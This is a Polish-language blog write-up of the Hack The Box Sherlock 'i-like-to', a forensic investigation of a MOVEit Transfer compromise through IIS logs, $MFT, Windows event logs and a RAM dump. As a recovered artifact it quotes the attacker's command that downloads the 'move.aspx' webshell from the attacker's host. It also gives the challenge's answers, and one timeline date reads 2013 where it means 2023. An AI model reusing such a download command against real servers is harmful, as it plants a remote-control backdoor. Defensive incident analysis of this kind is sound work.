---
title: Hack The Box Sherlock - i-like-to
date: 2025-09-07
tags:
  - blueteam
  - siem
  - homelab
showSummary: true
summary: Analiza Sherlocka "i-like-to" z HTB
draft: false
---

Przyjrzymy się dzisiaj pewnemu incydentowi, który miał miejsce na serwerze Windows. Dostaliśmy następujące informacje:

**We have unfortunately been hiding under a rock and do not see the many news articles referencing the recent MOVEit CVE being exploited in the wild. We believe our Windows server may be vulnerable and has recently fallen victim to this compromise. We need to understand this exploit in a bit more detail, confirm the actions of the attacker and retrieve some details so that we can implement them into our SOC environment. We have provided you with a triage of all the necessary artefacts from our compromised Windows server. PS: One of the artifacts is a memory dump, but we forgot to include the vmss file. You might have to go back to basics here...**

Na podstawie wstępnych informacji wynika, że mamy do czynienia z podatnością CVE-2023-34362. To krytyczna podatność (9.8 w CVSS:3.1) typu SQL Injection. Została wykryta w aplikacji MOVEit Transfer, służącej do transferu plików. Pozwala na ich szyforwanie, używa protokołu FTP oraz SFTP i ma funkcje automatyzujące wymianę plików, umożliwia logowanie zdarzeń i raportowanie. Wykorzystanie podatności umożliwia uzyskanie dostępu do bazy danych MOVEit z poziomu aplikacji webowej bez uwierzytelnienia (złamanie poufności), a następnie modyfikację tabel (złamanie integralności) i samego dostępu (złamanie dostępności).

Otrzymaliśmy plik zip z materiałami

![iliketo_files](/images/iliketo_files.png)
Plik VMEM (Virtual Memory File) jest dumpem pamięci RAM maszyny wirtualnej, natomiast brakujący plik VMSS (Virtual Machine Suspend State) pozwoliłby na wznowienie maszyny, w dokładnym miejscu gdzie ją wstrzymano.

Odpalamy naszą maszynę wirtualną Windows 10 i bierzemy się do roboty. Dobrą praktyką jest również stworzyć kopię otrzymanych dowodów - lepiej nie pracować na oryginałach. Sprawdźmy też, czy zachowaliśmy integralność dowodów.

![iliketo_integrity](/images/iliketo_integrity.png)

## Pytanie 1

**Name of the ASPX webshell uploaded by the attacker?**

ASPX webshell to malware napisany w technologii ASP.NET, który umożliwia zdalne sterowanie serwerem WWW przez atakującego. Korzystając z narzędzia Autopsy znajdujemy plik tekstowy z logami, najpewniej PowerShella. TA (Threat Actor) najprawdopodobniej pobrał webshell "move.aspx" mając już zdalny dostęp do serwera. Dodatkowo widzimy, że zmienił webshell z moveit.asp na move.aspx. Możliwe, że pierwszy nie działał.

![webshell_name](/images/webshell_name.png)

**Odpowiedź: move.aspx**

![iliketo_odp1](/images/iliketo_odp1.png)

## Pytanie 2

**What was the attacker's IP address?**

Przeszukajmy pliki w Autopsy po słowie kluczowym move.aspx. Najprawdopodobniej adresem IP TA jest 10.255.254.3, ale spróbujmy uzyskać szerszy kontekst. Sprawdźmy logi w pliku u_ex230712.log

![iliketo_broader_persp](/images/iliketo_broader_persp.png)

Adres IP klienta to ponownie 10.255.254.3. Próbował uzyskać dostęp do webshella przez przeglądarkę Firefox. Zanotujmy timestamp. Zauważmy również, że TA próbował eksploitować podatność już wcześniej (podejrzane pliki guestaccess.aspx, moveit.asp, machine2.aspx) jednak move.aspx pojawia się najrzadziej i na końcu logów. Przeszukajmy logi po adresie IP i zobaczmy kiedy nastąpił pierwszy kontakt TA. Jest to ten sam plik u_ex230712.log

![iliketo_begin_scan](/images/iliketo_begin_scan.png)

12 lipca o godz. 10:11:15 UTC atakujący rozpoczął skanowanie za pomocą narzędzia Nmap - z tego samego adresu IP 10.255.254.3. 

![iliketo_small_log](/images/iliketo_small_log.png)

O godz. 10:21:53 TA wysłał żądanie POST do webshella (możliwe, że jakąś komendę, którą wykonał). Serwer zwrócił kod 200. Charakterystyczne dla zapytań POST jest to, że przekazane parametry nie są logowane (chyba, że skonfigurowano inaczej). Wiemy jedynie, że coś przekazano do pliku webshella.

Mamy kolejną odpowiedź!

**Odpowiedź: 10.255.254.3**

![iliketo_odp_2](/images/iliketo_odp_2.png)

## Pytanie 3

**What user agent was used to perform the initial attack?**

User agent to informacja wysyłana przez klienta w nagłówku HTTP do serwera. Zawiera dane o m.in. używanej przeglądarce, systemie operacyjnym. Widzimy podejrzany ruch wskazujący na użycie skryptu napisanego w Ruby - możliwe, że TA używa Frameworka Metasploit do wykonywania ataku.

![ilketo_big_log](/images/ilketo_big_log.png) 


**Odpowiedź: Ruby**

![iliketo_odp_3](/images/iliketo_odp_3.png)
## Pytanie 4

**When was the ASPX webshell uploaded by the attacker?**

Aby zobaczyć kiedy plik został umieszczony na serwerze skorzystamy z odnalezionego pliku bazodanowego $MFT, który zawiera informacje o wszystkich plikach i katalogach systemu - kiedy były tworzone, modyfikowane, zmieniane uprawnienia. Skorzystamy z jednego ze świetnych open-sourcowych narzędzi Erica Zimmermana, znanego amerykańskiego informatyka śledczego, w przeszłości pracującego w FBI - MFTECmd. Jego pakiet "EZ tools" jest dostępny na GitHubie i służy do analizowania plików/logów Windowsa. Wyeksportujemy plik do CSV i przeanalizujemy zawartość.

```
.\MFTECmd.exe -f "<lokalizacja $MFT>" --csv "<lokalizacja docelowa pliku CSV>" --csvf <nazwa>.csv
```

Szukamy słowa kluczowego "move.aspx" i znajdujemy dokładną datę - 12.07.2023 11:24:30. Został utworzony w **.\MOVEitTransfer\wwwroot**

![move_aspx_created](/images/move_aspx_created.png)

**Odpowiedź: 12.07.2023 11:24:30**

![iliketo_odp_4](/images/iliketo_odp_4.png)

## Pytanie 5

**The attacker uploaded an ASP webshell which didn't work, what is its filesize in bytes?**

Wróćmy do pliku ConsoleHost_history.txt. TA próbował uploadować plik moveit.asp, ale później wgrał move.aspx - ten pierwszy nie działał, co potwierdzają poniższe logi z pliku u_ex230712.log i kod 404. Move.aspx zwrócił kod 200 (sukces).

![move_it_404](/images/move_it_404.png)

wielkość niedziałającego pliku moveit.asp jest widoczna w $MFT

![move_asp_filesize](/images/move_asp_filesize.png)

**Odpowiedź: 1362**

![moveit_size](/images/moveit_size.png)

## Pytanie 6

**Which tool did the attacker use to initially enumerate the vulnerable server?**

Odpowiedź już znamy po wcześniejszej analizie. 

![scanning_tool](/images/scanning_tool.png)

**Odpowiedź: Nmap**

![iliketo_nmap_scan](/images/iliketo_nmap_scan.png)

## Pytanie 7

**We suspect the attacker may have changed the password for our service account. Please confirm the time this occurred (UTC)**

Jednym z cennych plików, które otrzymaliśmy do analizy to dziennik zdarzeń Windowsa, a konkretnie Security.evtx. Filtrujemy logi po **Event ID 4723 - An attempt was made to change an account's password**. Niestety nic nie ma.

![iliketo_change_pass_empty](/images/iliketo_change_pass_empty.png)

Spróbujmy poszukać po **Event ID 4724 - An attempt was made to reset an account's password**. Mamy 8 logów z czego najpóźniejszy jest specyficzny - konto usługowe "moveitsvc" zmieniło własne hasło - jest to najprawdopodobniej skompromitowane przez atakującego konto. Mamy kolejną odpowiedź.

![pass_change](/images/pass_change.png)

**Odpowiedź: 12/07/2023 11:09:27**

![iliketio_odp_7](/images/iliketio_odp_7.png)

## Pytanie 8

**Which protocol did the attacker utilize to remote into the compromised machine?**

Ponownie użyjemy jednego z narzędzi EZ Tools. EvtxECmd pozwoli nam na eksportowanie dziennika do pliku csv tylko z logami zdarzeń 4624, 4625, 4778, 4779. 

4624 - An account was successfully logged on
4625 - An account failed to log on
4778 - A session was reconnected to a Window Station
4779 - A session was disconnected from a Window Station

Sprawdzimy wszelkie zdarzenia związane z logowaniem na konto w Windows. 

![event_cmd_export](/images/event_cmd_export.png)

Filtrujemy po **Logon Type 10 -  user logged on to this computer remotely using Terminal Services or Remote Desktop (dokumentacja Microsoft)**

![logon_type_10](/images/logon_type_10.png)

![remote_acc_pt1](/images/remote_acc_pt1.png)

![remote_acc_pt2](/images/remote_acc_pt2.png)

Potwierdzamy, że logowanie miało miejsce. Host TA (10.255.254.3) logował się na konto moveitsvc przez RDP. 

**Odpowiedź: RDP**

![iliketo_answ_8](/images/iliketo_answ_8.png)

## Pytanie 9

**Please confirm the date and time the attacker remotely accessed the compromised machine?**

Co ciekawe z jakiegoś powodu te same zdarzenia różnią się 1 sekundą - w pliku CSV jest to 11:11:19, a w Event Viewer to 11:11:18. Ta druga jest najwyraźniej poprawna dla HTB. 

![rdp_time](/images/rdp_time.png)

![event_file_diff_time](/images/event_file_diff_time.png)

**Odpowiedź: 12.07.2023 11:11:18**

![iliketo_odp_9](/images/iliketo_odp_9.png)

## Pytanie 10

**What was the useragent that the attacker used to access the webshell?**

Wiemy, że użytym webshellem jest "move.aspx". Wracamy do pliku u_ex230712.log i szukamy słowa kluczowego.

![webshell_access](/images/webshell_access.png)

TA korzystał z graficznego środowiska okien X11, 64-bitowego systemu Linux, silnika renderującego Gecko (na której opiera się Firefox) w wersji 102.0 i przeglądarki Firefox w wersji 102.0

Swoją drogą, zastanawialiście się czasami czemu w nagłówkach HTTP jest Mozilla/5.0, mimo że klient nie był Firefoxem a np. Chrome? Okazuje się, że jest to relikt lat 90. i "wojen przeglądarkowych". W Internecie wtedy królował Netscape Navigator, który wspierał tzw. ramki. Ogólnie pozwalały podzielić stronę internetową na kilka części, z których każda wyświetlała osobny plik HTML. Dzięki temu twórcy stron mogli przygotować jeden plik zawierający menu z odnośnikami do podstron i załadować go w każdej stronie jako osobną stałą sekcję. W ten sposób, zamiast powielać kod menu w każdym pliku, wystarczyło zmienić tylko ten jeden plik z menu, a aktualizacja pojawiała się automatycznie na wszystkich podstronach. Były to czasy, gdy standardy dopiero raczkowały, a przeglądarki internetowe znacząco się od siebie różniły. W związku z tym narodziła się praktyka tzw. user agent sniffing - przeglądarki wysyłały w nagłówku HTTP informacje o sobie, a serwery na tej podstawie odsyłały odpowiednią wersję kodu HTML strony, aby zoptymalizować jej wyświetlanie na konkretnej przeglądarce.

Przeglądarka Netscape, będąca wówczas liderem rynku, identyfikowała się jako "Mozilla" - nazwa ta pochodziła od połączenia słów Mosaic (pierwsza popularna graficzna przeglądarka) i Godzilla. W tym samym czasie Microsoft wprowadził Internet Explorer, również obsługujący ramki - jednak ze względu na jego małą popularność, wiele serwerów nie rozpoznawało go jako przeglądarki zdolnej do obsługi nowoczesnych funkcji. W efekcie użytkownicy Internet Explorera otrzymywali uproszczone wersje stron lub takie, które nie działały poprawnie.

Microsoft zdecydował się na kontrowersyjny krok - Internet Explorer również zaczął wysyłać w nagłówku identyfikator "Mozilla". Dzięki temu serwery „myślały”, że mają do czynienia z przeglądarką Netscape i przesyłały pełną wersję strony. Wkrótce inne przeglądarki poszły tą samą drogą, co sprawiło, że do dziś w nagłówkach User-Agent znaleźć można odwołanie do "Mozilli", niezależnie od faktycznej przeglądarki.

**Odpowiedź: Mozilla/5.0+(X11;+Linux+x86_64;+rv:102.0)+Gecko/20100101+Firefox/102.0**

![iliketo_q_10](/images/iliketo_q_10.png)

## Pytanie 11

**What is the inst ID of the attacker?**

Jednym z plików, które otrzymaliśmy jest zestaw instrukcji SQL. Uruchomimy lokalny serwer SQL i sprawdzimy zawartość.



![creating_schema](/images/creating_schema.png)

![data_import](/images/data_import.png)

![importing_data](/images/importing_data.png)

Sprawdzimy tabelę "log"

![new_tables](/images/new_tables.png)
![inst_id](/images/inst_id.png)

Widzimy utworzone konta gościa oraz adres IP atakującego. 

**Odpowiedź: 1234**

![iliketo_q_11](/images/iliketo_q_11.png)

## Pytanie 12

**What command was run by the attacker to retrieve the webshell?**

Wróćmy do pliku ConsoleHost_history.txt - widzimy, że TA po uzyskaniu zdalnego dostępu wykonał polecenie wget, aby dostać się do webshella.

![webshell_name](/images/webshell_name.png)

**Odpowiedź: `wget http://10.255.254.3:9001/move.aspx -OutFile move.aspx`**

![iliketo_q_12](/images/iliketo_q_12.png)

## Pytanie 13

**What was the string within the title header of the webshell deployed by the TA?**

Przeszukajmy dump pamięci RAM .vmem. Niestety nie mamy pliku .vmss, a bez tego Volatility 3 nie zadziała. Zdecydowałem się więc na użycie strings.exe z pakietu Sysinternals Windowsa.

`.\strings.exe C:\Users\analyst\Desktop\iliketo\I-like-to-27a787c5.vmem | Select-String -Pattern "<title>" -Context 20,20`

Polecenie przeszuka linijki ze słowem kluczowym oraz 20 linijkami powyżej i poniżej, dla szerszego kontekstu. Po analizie po słowie "title" mamy odpowiedź.

![webshell_title](/images/webshell_title.png) 

**Odpowiedź: awen asp.net webshell**

![iliketo_q_13](/images/iliketo_q_13.png)

## Pytanie 14

**What did the TA change the our moveitsvc account password to?**

Ponownie poszukamy odpowiedzi w dumpie RAM-u. Skorzystamy ze wskazówki w pytaniu i użyjemy słowa kluczowego moveitsvc. Przeniesiemy się też na Kali Linuxa (WSL), ponieważ z jakichś powodów strings z Sysinternals nie mi wypluwał żadnych wyników.

`strings I-like-to-27a787c5.vmem | grep moveitsvc > moveitsvc-result.txt`

Po dłuższych poszukiwaniach na samym końcu pliku mamy to czego chcieliśmy

![wsl_search](/images/wsl_search.png)

TA użył narzędzia net.

**Odpowiedź: 5trongP4ssw0rd**

![iliketo_odp_14](/images/iliketo_odp_14.png)

## Podsumowanie

Na koniec uporządkujmy działania TA odtwórzmy po kolei zdarzenia.

|   Data i godzina    |                                        Opis                                         |
| :-----------------: | :---------------------------------------------------------------------------------: |
| 12/07/2013 10:11:15 |                       TA rozpoczął skanowanie narzędziem Nmap                       |
| 12/07/2023 10:21:53 | Pierwsza próba wykorzystania podatności i użycia webshella - POST do /machine2.aspx |
| 12/07/2023 11:09:27 |                 Zmiana hasła konta usługowego "moveitsvc" przez TA                  |
| 12.07.2023 11:11:18 |        Uzyskanie zdalnego dostępu do hosta przez TA (RDP na konto moveitsvc)        |
| 12/07/2023 11:18:36 |              Nieudana próba uzyskania dostępu do webshella moveit.asp               |
| 12/07/2023 11:24:30 |            Upload nowego webshella move.aspx do .\MOVEitTransfer\wwwroot            |
| 12/07/2023 11:24:47 |                  Wykonanie zapytania POST do endpointu /move.aspx                   |